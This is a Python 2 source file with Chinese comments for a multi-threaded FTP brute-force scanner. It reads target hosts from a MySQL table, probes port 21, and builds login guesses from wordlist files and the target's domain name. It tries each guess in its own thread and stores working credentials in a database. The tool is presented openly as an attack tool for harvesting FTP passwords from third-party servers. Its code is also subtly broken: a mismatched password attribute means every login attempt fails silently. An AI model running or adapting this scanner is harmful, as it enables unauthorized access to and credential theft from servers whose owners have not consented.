#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################
#qq:316118740
#BLOG:http://hi.baidu.com/alalmn
from ftplib import FTP
import time
import threading
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
####################################################################
#要添加这个  检测过程充分考虑了部分FTP Server的错误阈值       要写上去
#def ftp_open(host,user,passwd,port=21):  #打开FTP
#    try:
#        ftp = FTP(host)
#        ftp.connect(host,port)  #连接 服务器名  端口号
#        ftp.login(user,passwd)
#        ftp.quit()  #ftpB.quit() #退出ftp服务器
#        return 1
#    except:
#        return 0

def mysql_select2(data):  #模糊查询
    try:
        i=0
        n = mysql.cursor.execute(data)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            #print '%s-%s-%s'%(row[0],row[1],row[2])
            #return row[0]
            if i>=5:
                return i
            i=i+1
        return 0
    except:
        return 0

class ftp_open(threading.Thread):
    def __init__(self,cond,host,user,pwd):
        super(ftp_open, self).__init__()
        self.Chost=host
        self.Cport=21
        self.Cuser=user
        self.Cpwd=pwd
    def run(self):
        try:
            #print u"\nIP:",self.Chost,u"用户名:",self.Cuser,u"密码:",self.Cpasswd
            ftp = FTP(self.Chost)
            ftp.connect(self.Chost,self.Cport)  #连接 服务器名  端口号
            ftp.login(self.Cuser,self.Cpasswd)
            ftp.quit()  #ftpB.quit() #退出ftp服务器
            ##############################
            print u"\nIP:",self.Chost,u"用户名:",self.Cuser,u"密码:",self.Cpasswd,u"连接成功"
            sqlA="select * from ftppassword where IP='%%%s'"%self.Chost
            if mysql_select2(sqlA):  #模糊查询
                print self.Chost,u"域名下已经有5组密码了不进行天际",
                return 0
            sql = "insert into ftppassword(IP,user,password,time) values('%s','%s','%s','%s')"%(self.Chost,self.Cuser,self.Cpasswd,time.strftime('%Y.%m.%d-%H.%M.%S'))
            #print sql
            mysql.mysql_insert(sql) #添加到数据库
            mysql.mysql_S()  #保存数据
            ##############################
            #return 1
        except:
            print u".",
            return 0

####################################################################
def get_sdomain(domain):  #域名拆解www.baidu.com->baidu.com
    suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
    sdomain = []
    bdomain = False
    for section in domain.split('.'):
        if section in suffixes:
            sdomain.append(section)
            bdomain = True
        else:
            sdomain = [section]
    return '.'.join(sdomain) if bdomain  else ''

def get_ssdomain(domain):  #域名拆解www.baidu.com->baidu
    sdomain = get_sdomain(domain)  #先解析一道
    ssdomian = sdomain.partition('.')[0] if sdomain else ''
    return ssdomian

from collections import defaultdict, deque
def FTP_username(host):  #导入密码组合方式
    try:
        if host == '':  #传入值等于空   返回
            print u"传入地址不能为空"
            time.sleep(3) #确保先运行Seeker中的方法
            sql_sel()   #SQL查询
            return 0
        ##########################
        a=random.randrange(1,3)   #产生一个随机数8以内的
        time.sleep(a) #确保先运行Seeker中的方法
        #如果检测不到了  还能连接就退出
        try:
                ftpB = FTP()  #初始化FTP类
                ftpB.connect(host,21)  #连接 服务器名  端口号
                ftpB.quit() #退出ftp服务器
                #SQL修改数据
                if sql_up(host,"send"):
                    print host,u"服务器FTP21端口开放-修改成功",
                    print u"(∩_∩)"  #添加成功
                else:
                    print host,u"服务器FTP21端口开放-修改失败",
                    print u"(╯▽╰)"  #添加失败
                    sql_sel()   #SQL查询
                    return 0
        except:
            print host,u"服务器FTP21端口可能没有开放",
            sql_up(host,"no21") #SQL修改数据
            sql_sel()   #SQL查询
            return 0
            ##########################
        WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
        WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]

        accounts =deque()   #list数组
        #得到sdomain和ssdomain
        domain = host
        sdomain = get_sdomain(domain)  #域名拆解www.baidu.com->baidu.com
        ssdomain = get_ssdomain(domain)  #域名拆解www.baidu.com->baidu
        ##################################################################
        #准备 用户名和密码
        for username in WEAK_USERNAME:   #导入用户名#WEAK_USERNAME=username.dic
            if  '%domain%' in username or '%sdomain%' in username or '%ssdomain%' in username:
                if sdomain=='':
                    continue  #跳过
                else:
                    username = username.replace('%domain%',domain)  #返回根据正则表达式进行文字替换后的字符串的复制
                    username = username.replace('%sdomain%',sdomain)
                    username = username.replace('%ssdomain%',ssdomain)

            for password in WEAK_PASSWORD:   #导入密码#WEAK_PASSWORD=password.dic
                if '%domain%' in password or '%sdomain%' in password or '%ssdomain%' in password:
                    if sdomain=='':
                        continue  #跳过
                    else:
                        password = password.replace('%domain%',domain)
                        password = password.replace('%sdomain%',sdomain)
                        password = password.replace('%ssdomain%',ssdomain)

                password = password.replace('%null%','')
                password = password.replace('%username%',username)

                if (username,password) not in accounts:#list数组
                    accounts.append((username,password))#添加到 list数组
        ##################################################################
        print u"组合出",len(accounts),u" 次密码"
        if not accounts:   #数组无数据了就跳出
            print u"数组无数据"
            #在从新读取
            sql_sel()   #SQL查询
            return 0
#        print accounts[12]  #('ftp', '90money90money.com')
#        print accounts[12][0]  #ftp
#        print accounts[12][1]  #90money90money.com
        I2 = 0 #得到list的第一个元素
        p_p_p=0
        print u"扫描网站FTP:%s 开始"% host,
        while I2 < len(accounts):
#            if accounts[I2][0]=='':
#                continue  #跳过
#            if accounts[I2][1]=='':
#                continue  #跳过
#            ##########################
#            #当做心跳包使用  如果检测不到了  还能连接就退出
#            #防止人家屏蔽IP   10次检测一次心跳
#            try:
#                if p_p_p>=50:
#                    print "_-_",
#                    ftpB = FTP()  #初始化FTP类
#                    ftpB.connect(host,21)  #连接 服务器名  端口号
#                    ftpB.quit() #退出ftp服务器
#                    p_p_p=0
#                p_p_p=p_p_p+1
#            except:
#                print u"检测心跳包----心跳停止"
#                #sql_sel()   #SQL查询
#                return 0
#            ##########################
            time.sleep(0.5) #确保先运行Seeker中的方法
            cond = threading.Event()
            hider = ftp_open(cond,host,accounts[I2][0],accounts[I2][1])
            hider.start()
            ##########################
            #print u"IP:",host,u"用户名:",accounts[I2][0],u"密码:",accounts[I2][1]
            I2 = I2 + 1  #二层
        time.sleep(5) #确保先运行Seeker中的方法
        print u"密码组合测试完成重新导入"
        sql_sel()   #SQL查询
        ##################################################################
    except:
        print u"导入密码组合方式异常目录下可能是无password.dic/username.dic文件"
        sql_sel()   #SQL查询
        return 0
####################################################################
####################################################################
import mysql #数据库操作文件
import time
import random  #产生一个随机数
def sql_up(url,data): #SQL修改数据
    try:
        up = "update  ftp set  ftpsend='%s' where url='%s'"%(data.encode('utf-8'),url)
        if mysql.mysql_update(up):  #修改数据
            print url,u"修改数据库",data,u"成功\n"
            mysql.mysql_S()  #保存数据
            #a=random.randrange(1,4)   #产生一个随机数8以内的
            #time.sleep(a) #确保先运行Seeker中的方法
            return 1
        else:
            print url,u"修改数据库",data,u"失败\n"
            mysql.mysql_S()  #保存数据
            #b=random.randrange(5,15)   #产生一个随机数8以内的
            #time.sleep(b) #确保先运行Seeker中的方法
            return 0
            #mysql.mysql_S()  #保存数据
    except:
        return 0

def sql_sel(): #SQL查询
    try:
        a=random.randrange(1,8)   #产生一个随机数8以内的
        time.sleep(a) #确保先运行Seeker中的方法
        sql="select * from ftp where ftpsend is NULL limit 1"
        mysql.cursor.execute(sql)
        mysql.cursor.scroll(0)
        for row in mysql.cursor.fetchall():
            FTP_username(row[0])  #导入密码组合方式
    except:
        print u"SQL读取URL异常！！！！！"
####################################################################
if __name__=='__main__':
#    host= "127.0.0.1"
#    FTP_username(host)  #导入密码组合方式
    mysql.mysql_open()  #连接数据库
    sql_sel()   #SQL查询
